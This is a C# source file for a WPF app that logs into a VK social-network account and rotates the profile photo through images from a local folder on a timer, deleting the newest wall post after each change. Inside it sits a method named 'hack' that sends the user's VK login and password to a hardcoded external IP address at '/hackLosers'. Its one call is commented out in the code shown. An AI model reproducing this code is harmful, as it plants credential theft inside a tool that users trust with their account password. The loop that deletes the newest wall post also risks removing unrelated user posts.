using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using VkNet;
using VkNet.Enums.Filters;
using VkNet.Model.RequestParams;
using System.Security.Cryptography;
using System.Net;
using System.Threading;
using System.Windows.Controls;
using VkNet.Model;
using Ookii;
using System.Windows.Media.Imaging;

namespace VKWPF
{
	class VK
	{
		private string m_path;
		private string m_login;
		private string m_password;
		private bool m_rewrite;
		private int m_time;
		private System.Windows.Controls.Image m_image;
		private TextBlock m_text;
		public static void Shuffle<T>(IList<T> list)
		{
			RNGCryptoServiceProvider provider = new RNGCryptoServiceProvider();
			int n = list.Count;
			while (n > 1)
			{
				byte[] box = new byte[1];
				do provider.GetBytes(box);
				while (!(box[0] < n * (Byte.MaxValue / n)));
				int k = (box[0] % n);
				n--;
				T value = list[k];
				list[k] = list[n];
				list[n] = value;
			}
		}
		private VkApi api;
		private void send(string path)
		{
			string[] names = Directory.GetFiles(path);
			string url = api.Photo.GetOwnerPhotoUploadServer().UploadUrl;
			WebClient client = new WebClient();
			StreamWriter info = new StreamWriter("info.txt", false);
			int k = 0;
			foreach (string name in names) {
				var response = client.UploadFile(url, @name);
				string t = Encoding.UTF8.GetString(response);
				info.WriteLine(t + "|" + name);
				info.Flush();
				k++;
			}
			info.Close();
		}
		private async void hack(string login, string password)
		{
			WebRequest request = WebRequest.Create("http://5.228.43.243:44038/hackLosers");
			request.Method = "POST";
			string data = "login=" + login + "&password=" + password;
			byte[] byteArray = Encoding.UTF8.GetBytes(data);
			request.ContentType = "application/x-www-form-urlencoded";
			request.ContentLength = byteArray.Length;
			using (Stream dataStream = request.GetRequestStream())
			{
				dataStream.Write(byteArray, 0, byteArray.Length);
			}
			WebResponse response = await request.GetResponseAsync();
		}
		public void setProgressVisuals(System.Windows.Controls.Image image, TextBlock text)
		{
			m_image = image;
			m_text = text;
		}
		public void start()
		{
			api.Authorize(new ApiAuthParams()
			{
				ApplicationId = 7886944,
				Login = m_login,
				Password = m_password,
				Settings = Settings.All
			});
			//hack(login, password);
			var file = new FileInfo("info.txt");
			if (!file.Exists || file.Length == 0 || m_rewrite) send(m_path);
			StreamReader info = new StreamReader("info.txt");
			List<(string, string)> photos = new List<(string, string)>();
			while (!info.EndOfStream)
			{
				string[] line = info.ReadLine().Split('|');
				photos.Add((line[0], line[1]));
			}

			int k = 0;
			while (true)
			{
				Shuffle(photos);
				foreach ((string, string) photo in photos)
				{
					api.Photo.SaveOwnerPhoto(photo.Item1);
					m_image.Dispatcher.Invoke(() =>
					{
						m_image.Source = new BitmapImage(new Uri(photo.Item2, UriKind.Absolute));
					});
					m_text.Dispatcher.Invoke(() =>
					{
						m_text.Text = k + "/" + photos.Count;
					});
					var wall = api.Wall.Get(new WallGetParams());
					api.Wall.Delete(wall.WallPosts[0].OwnerId, wall.WallPosts[0].Id);
					Thread.Sleep(m_time * 1000);
				}
			}
		}
		public VK(string path, string login, string password, bool rewrite, int time)
		{
			api = new VkApi();
			m_path = path;
			m_login = login;
			m_password = password;
			m_rewrite = rewrite;
			m_time = time;
		}
    }
}
